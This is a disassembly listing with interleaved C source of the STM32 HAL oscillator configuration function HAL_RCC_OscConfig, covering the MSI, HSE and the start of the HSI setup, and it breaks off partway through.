HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 800390c:	b580      	push	{r7, lr}
 800390e:	b088      	sub	sp, #32
 8003910:	af00      	add	r7, sp, #0
 8003912:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 8003914:	687b      	ldr	r3, [r7, #4]
 8003916:	2b00      	cmp	r3, #0
 8003918:	d102      	bne.n	8003920 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 800391a:	2301      	movs	r3, #1
 800391c:	f000 bc02 	b.w	8004124 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 8003920:	4b96      	ldr	r3, [pc, #600]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003922:	689b      	ldr	r3, [r3, #8]
 8003924:	f003 030c 	and.w	r3, r3, #12
 8003928:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 800392a:	4b94      	ldr	r3, [pc, #592]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 800392c:	68db      	ldr	r3, [r3, #12]
 800392e:	f003 0303 	and.w	r3, r3, #3
 8003932:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 8003934:	687b      	ldr	r3, [r7, #4]
 8003936:	681b      	ldr	r3, [r3, #0]
 8003938:	f003 0310 	and.w	r3, r3, #16
 800393c:	2b00      	cmp	r3, #0
 800393e:	f000 80e4 	beq.w	8003b0a <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_MSI) ||
 8003942:	69bb      	ldr	r3, [r7, #24]
 8003944:	2b00      	cmp	r3, #0
 8003946:	d007      	beq.n	8003958 <HAL_RCC_OscConfig+0x4c>
 8003948:	69bb      	ldr	r3, [r7, #24]
 800394a:	2b0c      	cmp	r3, #12
 800394c:	f040 808b 	bne.w	8003a66 <HAL_RCC_OscConfig+0x15a>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_MSI)))
 8003950:	697b      	ldr	r3, [r7, #20]
 8003952:	2b01      	cmp	r3, #1
 8003954:	f040 8087 	bne.w	8003a66 <HAL_RCC_OscConfig+0x15a>
    {
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003958:	4b88      	ldr	r3, [pc, #544]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 800395a:	681b      	ldr	r3, [r3, #0]
 800395c:	f003 0302 	and.w	r3, r3, #2
 8003960:	2b00      	cmp	r3, #0
 8003962:	d005      	beq.n	8003970 <HAL_RCC_OscConfig+0x64>
 8003964:	687b      	ldr	r3, [r7, #4]
 8003966:	699b      	ldr	r3, [r3, #24]
 8003968:	2b00      	cmp	r3, #0
 800396a:	d101      	bne.n	8003970 <HAL_RCC_OscConfig+0x64>
      {
        return HAL_ERROR;
 800396c:	2301      	movs	r3, #1
 800396e:	e3d9      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      else
      {
        /* To correctly read data from FLASH memory, the number of wait states (LATENCY)
           must be correctly programmed according to the frequency of the CPU clock
           (HCLK) and the supply voltage of the device. */
        if(RCC_OscInitStruct->MSIClockRange > __HAL_RCC_GET_MSI_RANGE())
 8003970:	687b      	ldr	r3, [r7, #4]
 8003972:	6a1a      	ldr	r2, [r3, #32]
 8003974:	4b81      	ldr	r3, [pc, #516]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003976:	681b      	ldr	r3, [r3, #0]
 8003978:	f003 0308 	and.w	r3, r3, #8
 800397c:	2b00      	cmp	r3, #0
 800397e:	d004      	beq.n	800398a <HAL_RCC_OscConfig+0x7e>
 8003980:	4b7e      	ldr	r3, [pc, #504]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003982:	681b      	ldr	r3, [r3, #0]
 8003984:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003988:	e005      	b.n	8003996 <HAL_RCC_OscConfig+0x8a>
 800398a:	4b7c      	ldr	r3, [pc, #496]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 800398c:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003990:	091b      	lsrs	r3, r3, #4
 8003992:	f003 03f0 	and.w	r3, r3, #240	; 0xf0
 8003996:	4293      	cmp	r3, r2
 8003998:	d223      	bcs.n	80039e2 <HAL_RCC_OscConfig+0xd6>
        {
          /* First increase number of wait states update if necessary */
          if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 800399a:	687b      	ldr	r3, [r7, #4]
 800399c:	6a1b      	ldr	r3, [r3, #32]
 800399e:	4618      	mov	r0, r3
 80039a0:	f000 fd8c 	bl	80044bc <RCC_SetFlashLatencyFromMSIRange>
 80039a4:	4603      	mov	r3, r0
 80039a6:	2b00      	cmp	r3, #0
 80039a8:	d001      	beq.n	80039ae <HAL_RCC_OscConfig+0xa2>
          {
            return HAL_ERROR;
 80039aa:	2301      	movs	r3, #1
 80039ac:	e3ba      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
          }

          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80039ae:	4b73      	ldr	r3, [pc, #460]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039b0:	681b      	ldr	r3, [r3, #0]
 80039b2:	4a72      	ldr	r2, [pc, #456]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039b4:	f043 0308 	orr.w	r3, r3, #8
 80039b8:	6013      	str	r3, [r2, #0]
 80039ba:	4b70      	ldr	r3, [pc, #448]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039bc:	681b      	ldr	r3, [r3, #0]
 80039be:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80039c2:	687b      	ldr	r3, [r7, #4]
 80039c4:	6a1b      	ldr	r3, [r3, #32]
 80039c6:	496d      	ldr	r1, [pc, #436]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039c8:	4313      	orrs	r3, r2
 80039ca:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 80039cc:	4b6b      	ldr	r3, [pc, #428]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039ce:	685b      	ldr	r3, [r3, #4]
 80039d0:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 80039d4:	687b      	ldr	r3, [r7, #4]
 80039d6:	69db      	ldr	r3, [r3, #28]
 80039d8:	021b      	lsls	r3, r3, #8
 80039da:	4968      	ldr	r1, [pc, #416]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039dc:	4313      	orrs	r3, r2
 80039de:	604b      	str	r3, [r1, #4]
 80039e0:	e025      	b.n	8003a2e <HAL_RCC_OscConfig+0x122>
        }
        else
        {
          /* Else, keep current flash latency while decreasing applies */
          /* Selects the Multiple Speed oscillator (MSI) clock range .*/
          __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 80039e2:	4b66      	ldr	r3, [pc, #408]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039e4:	681b      	ldr	r3, [r3, #0]
 80039e6:	4a65      	ldr	r2, [pc, #404]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039e8:	f043 0308 	orr.w	r3, r3, #8
 80039ec:	6013      	str	r3, [r2, #0]
 80039ee:	4b63      	ldr	r3, [pc, #396]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039f0:	681b      	ldr	r3, [r3, #0]
 80039f2:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 80039f6:	687b      	ldr	r3, [r7, #4]
 80039f8:	6a1b      	ldr	r3, [r3, #32]
 80039fa:	4960      	ldr	r1, [pc, #384]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 80039fc:	4313      	orrs	r3, r2
 80039fe:	600b      	str	r3, [r1, #0]
          /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
          __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003a00:	4b5e      	ldr	r3, [pc, #376]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a02:	685b      	ldr	r3, [r3, #4]
 8003a04:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003a08:	687b      	ldr	r3, [r7, #4]
 8003a0a:	69db      	ldr	r3, [r3, #28]
 8003a0c:	021b      	lsls	r3, r3, #8
 8003a0e:	495b      	ldr	r1, [pc, #364]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a10:	4313      	orrs	r3, r2
 8003a12:	604b      	str	r3, [r1, #4]

          /* Decrease number of wait states update if necessary */
          /* Only possible when MSI is the System clock source  */
          if(sysclk_source == RCC_CFGR_SWS_MSI)
 8003a14:	69bb      	ldr	r3, [r7, #24]
 8003a16:	2b00      	cmp	r3, #0
 8003a18:	d109      	bne.n	8003a2e <HAL_RCC_OscConfig+0x122>
          {
            if(RCC_SetFlashLatencyFromMSIRange(RCC_OscInitStruct->MSIClockRange) != HAL_OK)
 8003a1a:	687b      	ldr	r3, [r7, #4]
 8003a1c:	6a1b      	ldr	r3, [r3, #32]
 8003a1e:	4618      	mov	r0, r3
 8003a20:	f000 fd4c 	bl	80044bc <RCC_SetFlashLatencyFromMSIRange>
 8003a24:	4603      	mov	r3, r0
 8003a26:	2b00      	cmp	r3, #0
 8003a28:	d001      	beq.n	8003a2e <HAL_RCC_OscConfig+0x122>
            {
              return HAL_ERROR;
 8003a2a:	2301      	movs	r3, #1
 8003a2c:	e37a      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
            }
          }
        }

        /* Update the SystemCoreClock global variable */
        SystemCoreClock = HAL_RCC_GetSysClockFreq() >> (AHBPrescTable[READ_BIT(RCC->CFGR, RCC_CFGR_HPRE) >> RCC_CFGR_HPRE_Pos] & 0x1FU);
 8003a2e:	f000 fc81 	bl	8004334 <HAL_RCC_GetSysClockFreq>
 8003a32:	4602      	mov	r2, r0
 8003a34:	4b51      	ldr	r3, [pc, #324]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a36:	689b      	ldr	r3, [r3, #8]
 8003a38:	091b      	lsrs	r3, r3, #4
 8003a3a:	f003 030f 	and.w	r3, r3, #15
 8003a3e:	4950      	ldr	r1, [pc, #320]	; (8003b80 <HAL_RCC_OscConfig+0x274>)
 8003a40:	5ccb      	ldrb	r3, [r1, r3]
 8003a42:	f003 031f 	and.w	r3, r3, #31
 8003a46:	fa22 f303 	lsr.w	r3, r2, r3
 8003a4a:	4a4e      	ldr	r2, [pc, #312]	; (8003b84 <HAL_RCC_OscConfig+0x278>)
 8003a4c:	6013      	str	r3, [r2, #0]

        /* Configure the source of time base considering new system clocks settings*/
        status = HAL_InitTick(uwTickPrio);
 8003a4e:	4b4e      	ldr	r3, [pc, #312]	; (8003b88 <HAL_RCC_OscConfig+0x27c>)
 8003a50:	681b      	ldr	r3, [r3, #0]
 8003a52:	4618      	mov	r0, r3
 8003a54:	f7fd fb86 	bl	8001164 <HAL_InitTick>
 8003a58:	4603      	mov	r3, r0
 8003a5a:	73fb      	strb	r3, [r7, #15]
        if(status != HAL_OK)
 8003a5c:	7bfb      	ldrb	r3, [r7, #15]
 8003a5e:	2b00      	cmp	r3, #0
 8003a60:	d052      	beq.n	8003b08 <HAL_RCC_OscConfig+0x1fc>
        {
          return status;
 8003a62:	7bfb      	ldrb	r3, [r7, #15]
 8003a64:	e35e      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Check the MSI State */
      if(RCC_OscInitStruct->MSIState != RCC_MSI_OFF)
 8003a66:	687b      	ldr	r3, [r7, #4]
 8003a68:	699b      	ldr	r3, [r3, #24]
 8003a6a:	2b00      	cmp	r3, #0
 8003a6c:	d032      	beq.n	8003ad4 <HAL_RCC_OscConfig+0x1c8>
      {
        /* Enable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_ENABLE();
 8003a6e:	4b43      	ldr	r3, [pc, #268]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a70:	681b      	ldr	r3, [r3, #0]
 8003a72:	4a42      	ldr	r2, [pc, #264]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a74:	f043 0301 	orr.w	r3, r3, #1
 8003a78:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003a7a:	f7fd fbc3 	bl	8001204 <HAL_GetTick>
 8003a7e:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a80:	e008      	b.n	8003a94 <HAL_RCC_OscConfig+0x188>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003a82:	f7fd fbbf 	bl	8001204 <HAL_GetTick>
 8003a86:	4602      	mov	r2, r0
 8003a88:	693b      	ldr	r3, [r7, #16]
 8003a8a:	1ad3      	subs	r3, r2, r3
 8003a8c:	2b02      	cmp	r3, #2
 8003a8e:	d901      	bls.n	8003a94 <HAL_RCC_OscConfig+0x188>
          {
            return HAL_TIMEOUT;
 8003a90:	2303      	movs	r3, #3
 8003a92:	e347      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) == 0U)
 8003a94:	4b39      	ldr	r3, [pc, #228]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003a96:	681b      	ldr	r3, [r3, #0]
 8003a98:	f003 0302 	and.w	r3, r3, #2
 8003a9c:	2b00      	cmp	r3, #0
 8003a9e:	d0f0      	beq.n	8003a82 <HAL_RCC_OscConfig+0x176>
          }
        }
         /* Selects the Multiple Speed oscillator (MSI) clock range .*/
        __HAL_RCC_MSI_RANGE_CONFIG(RCC_OscInitStruct->MSIClockRange);
 8003aa0:	4b36      	ldr	r3, [pc, #216]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003aa2:	681b      	ldr	r3, [r3, #0]
 8003aa4:	4a35      	ldr	r2, [pc, #212]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003aa6:	f043 0308 	orr.w	r3, r3, #8
 8003aaa:	6013      	str	r3, [r2, #0]
 8003aac:	4b33      	ldr	r3, [pc, #204]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003aae:	681b      	ldr	r3, [r3, #0]
 8003ab0:	f023 02f0 	bic.w	r2, r3, #240	; 0xf0
 8003ab4:	687b      	ldr	r3, [r7, #4]
 8003ab6:	6a1b      	ldr	r3, [r3, #32]
 8003ab8:	4930      	ldr	r1, [pc, #192]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003aba:	4313      	orrs	r3, r2
 8003abc:	600b      	str	r3, [r1, #0]
         /* Adjusts the Multiple Speed oscillator (MSI) calibration value.*/
        __HAL_RCC_MSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->MSICalibrationValue);
 8003abe:	4b2f      	ldr	r3, [pc, #188]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003ac0:	685b      	ldr	r3, [r3, #4]
 8003ac2:	f423 427f 	bic.w	r2, r3, #65280	; 0xff00
 8003ac6:	687b      	ldr	r3, [r7, #4]
 8003ac8:	69db      	ldr	r3, [r3, #28]
 8003aca:	021b      	lsls	r3, r3, #8
 8003acc:	492b      	ldr	r1, [pc, #172]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003ace:	4313      	orrs	r3, r2
 8003ad0:	604b      	str	r3, [r1, #4]
 8003ad2:	e01a      	b.n	8003b0a <HAL_RCC_OscConfig+0x1fe>

      }
      else
      {
        /* Disable the Internal High Speed oscillator (MSI). */
        __HAL_RCC_MSI_DISABLE();
 8003ad4:	4b29      	ldr	r3, [pc, #164]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003ad6:	681b      	ldr	r3, [r3, #0]
 8003ad8:	4a28      	ldr	r2, [pc, #160]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003ada:	f023 0301 	bic.w	r3, r3, #1
 8003ade:	6013      	str	r3, [r2, #0]

        /* Get timeout */
        tickstart = HAL_GetTick();
 8003ae0:	f7fd fb90 	bl	8001204 <HAL_GetTick>
 8003ae4:	6138      	str	r0, [r7, #16]

        /* Wait till MSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003ae6:	e008      	b.n	8003afa <HAL_RCC_OscConfig+0x1ee>
        {
          if((HAL_GetTick() - tickstart) > MSI_TIMEOUT_VALUE)
 8003ae8:	f7fd fb8c 	bl	8001204 <HAL_GetTick>
 8003aec:	4602      	mov	r2, r0
 8003aee:	693b      	ldr	r3, [r7, #16]
 8003af0:	1ad3      	subs	r3, r2, r3
 8003af2:	2b02      	cmp	r3, #2
 8003af4:	d901      	bls.n	8003afa <HAL_RCC_OscConfig+0x1ee>
          {
            return HAL_TIMEOUT;
 8003af6:	2303      	movs	r3, #3
 8003af8:	e314      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U)
 8003afa:	4b20      	ldr	r3, [pc, #128]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003afc:	681b      	ldr	r3, [r3, #0]
 8003afe:	f003 0302 	and.w	r3, r3, #2
 8003b02:	2b00      	cmp	r3, #0
 8003b04:	d1f0      	bne.n	8003ae8 <HAL_RCC_OscConfig+0x1dc>
 8003b06:	e000      	b.n	8003b0a <HAL_RCC_OscConfig+0x1fe>
      if((READ_BIT(RCC->CR, RCC_CR_MSIRDY) != 0U) && (RCC_OscInitStruct->MSIState == RCC_MSI_OFF))
 8003b08:	bf00      	nop
        }
      }
    }
  }
  /*------------------------------- HSE Configuration ------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSE) == RCC_OSCILLATORTYPE_HSE)
 8003b0a:	687b      	ldr	r3, [r7, #4]
 8003b0c:	681b      	ldr	r3, [r3, #0]
 8003b0e:	f003 0301 	and.w	r3, r3, #1
 8003b12:	2b00      	cmp	r3, #0
 8003b14:	d073      	beq.n	8003bfe <HAL_RCC_OscConfig+0x2f2>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSE(RCC_OscInitStruct->HSEState));

    /* When the HSE is used as system clock or clock source for PLL in these cases it is not allowed to be disabled */
    if((sysclk_source == RCC_CFGR_SWS_HSE) ||
 8003b16:	69bb      	ldr	r3, [r7, #24]
 8003b18:	2b08      	cmp	r3, #8
 8003b1a:	d005      	beq.n	8003b28 <HAL_RCC_OscConfig+0x21c>
 8003b1c:	69bb      	ldr	r3, [r7, #24]
 8003b1e:	2b0c      	cmp	r3, #12
 8003b20:	d10e      	bne.n	8003b40 <HAL_RCC_OscConfig+0x234>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSE)))
 8003b22:	697b      	ldr	r3, [r7, #20]
 8003b24:	2b03      	cmp	r3, #3
 8003b26:	d10b      	bne.n	8003b40 <HAL_RCC_OscConfig+0x234>
    {
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003b28:	4b14      	ldr	r3, [pc, #80]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b2a:	681b      	ldr	r3, [r3, #0]
 8003b2c:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003b30:	2b00      	cmp	r3, #0
 8003b32:	d063      	beq.n	8003bfc <HAL_RCC_OscConfig+0x2f0>
 8003b34:	687b      	ldr	r3, [r7, #4]
 8003b36:	685b      	ldr	r3, [r3, #4]
 8003b38:	2b00      	cmp	r3, #0
 8003b3a:	d15f      	bne.n	8003bfc <HAL_RCC_OscConfig+0x2f0>
      {
        return HAL_ERROR;
 8003b3c:	2301      	movs	r3, #1
 8003b3e:	e2f1      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
      }
    }
    else
    {
      /* Set the new HSE configuration ---------------------------------------*/
      __HAL_RCC_HSE_CONFIG(RCC_OscInitStruct->HSEState);
 8003b40:	687b      	ldr	r3, [r7, #4]
 8003b42:	685b      	ldr	r3, [r3, #4]
 8003b44:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003b48:	d106      	bne.n	8003b58 <HAL_RCC_OscConfig+0x24c>
 8003b4a:	4b0c      	ldr	r3, [pc, #48]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b4c:	681b      	ldr	r3, [r3, #0]
 8003b4e:	4a0b      	ldr	r2, [pc, #44]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b50:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b54:	6013      	str	r3, [r2, #0]
 8003b56:	e025      	b.n	8003ba4 <HAL_RCC_OscConfig+0x298>
 8003b58:	687b      	ldr	r3, [r7, #4]
 8003b5a:	685b      	ldr	r3, [r3, #4]
 8003b5c:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003b60:	d114      	bne.n	8003b8c <HAL_RCC_OscConfig+0x280>
 8003b62:	4b06      	ldr	r3, [pc, #24]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b64:	681b      	ldr	r3, [r3, #0]
 8003b66:	4a05      	ldr	r2, [pc, #20]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b68:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003b6c:	6013      	str	r3, [r2, #0]
 8003b6e:	4b03      	ldr	r3, [pc, #12]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b70:	681b      	ldr	r3, [r3, #0]
 8003b72:	4a02      	ldr	r2, [pc, #8]	; (8003b7c <HAL_RCC_OscConfig+0x270>)
 8003b74:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003b78:	6013      	str	r3, [r2, #0]
 8003b7a:	e013      	b.n	8003ba4 <HAL_RCC_OscConfig+0x298>
 8003b7c:	40021000 	.word	0x40021000
 8003b80:	0800d278 	.word	0x0800d278
 8003b84:	20000000 	.word	0x20000000
 8003b88:	20000004 	.word	0x20000004
 8003b8c:	4ba0      	ldr	r3, [pc, #640]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003b8e:	681b      	ldr	r3, [r3, #0]
 8003b90:	4a9f      	ldr	r2, [pc, #636]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003b92:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003b96:	6013      	str	r3, [r2, #0]
 8003b98:	4b9d      	ldr	r3, [pc, #628]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003b9a:	681b      	ldr	r3, [r3, #0]
 8003b9c:	4a9c      	ldr	r2, [pc, #624]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003b9e:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003ba2:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003ba4:	687b      	ldr	r3, [r7, #4]
 8003ba6:	685b      	ldr	r3, [r3, #4]
 8003ba8:	2b00      	cmp	r3, #0
 8003baa:	d013      	beq.n	8003bd4 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bac:	f7fd fb2a 	bl	8001204 <HAL_GetTick>
 8003bb0:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003bb2:	e008      	b.n	8003bc6 <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003bb4:	f7fd fb26 	bl	8001204 <HAL_GetTick>
 8003bb8:	4602      	mov	r2, r0
 8003bba:	693b      	ldr	r3, [r7, #16]
 8003bbc:	1ad3      	subs	r3, r2, r3
 8003bbe:	2b64      	cmp	r3, #100	; 0x64
 8003bc0:	d901      	bls.n	8003bc6 <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003bc2:	2303      	movs	r3, #3
 8003bc4:	e2ae      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003bc6:	4b92      	ldr	r3, [pc, #584]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003bc8:	681b      	ldr	r3, [r3, #0]
 8003bca:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003bce:	2b00      	cmp	r3, #0
 8003bd0:	d0f0      	beq.n	8003bb4 <HAL_RCC_OscConfig+0x2a8>
 8003bd2:	e014      	b.n	8003bfe <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003bd4:	f7fd fb16 	bl	8001204 <HAL_GetTick>
 8003bd8:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003bda:	e008      	b.n	8003bee <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003bdc:	f7fd fb12 	bl	8001204 <HAL_GetTick>
 8003be0:	4602      	mov	r2, r0
 8003be2:	693b      	ldr	r3, [r7, #16]
 8003be4:	1ad3      	subs	r3, r2, r3
 8003be6:	2b64      	cmp	r3, #100	; 0x64
 8003be8:	d901      	bls.n	8003bee <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003bea:	2303      	movs	r3, #3
 8003bec:	e29a      	b.n	8004124 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003bee:	4b88      	ldr	r3, [pc, #544]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003bf0:	681b      	ldr	r3, [r3, #0]
 8003bf2:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003bf6:	2b00      	cmp	r3, #0
 8003bf8:	d1f0      	bne.n	8003bdc <HAL_RCC_OscConfig+0x2d0>
 8003bfa:	e000      	b.n	8003bfe <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003bfc:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003bfe:	687b      	ldr	r3, [r7, #4]
 8003c00:	681b      	ldr	r3, [r3, #0]
 8003c02:	f003 0302 	and.w	r3, r3, #2
 8003c06:	2b00      	cmp	r3, #0
 8003c08:	d060      	beq.n	8003ccc <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003c0a:	69bb      	ldr	r3, [r7, #24]
 8003c0c:	2b04      	cmp	r3, #4
 8003c0e:	d005      	beq.n	8003c1c <HAL_RCC_OscConfig+0x310>
 8003c10:	69bb      	ldr	r3, [r7, #24]
 8003c12:	2b0c      	cmp	r3, #12
 8003c14:	d119      	bne.n	8003c4a <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003c16:	697b      	ldr	r3, [r7, #20]
 8003c18:	2b02      	cmp	r3, #2
 8003c1a:	d116      	bne.n	8003c4a <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003c1c:	4b7c      	ldr	r3, [pc, #496]	; (8003e10 <HAL_RCC_OscConfig+0x504>)
 8003c1e:	681b      	ldr	r3, [r3, #0]
 8003c20:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c24:	2b00      	cmp	r3, #0
 8003c26:	d005      	beq.n	8003c34 <HAL_RCC_OscConfig+0x328>
 8003c28:	687b      	ldr	r3, [r7, #4]
 8003c2a:	68db      	ldr	r3, [r3, #12]
 8003c2c:	2b00      	cmp	r3, #0
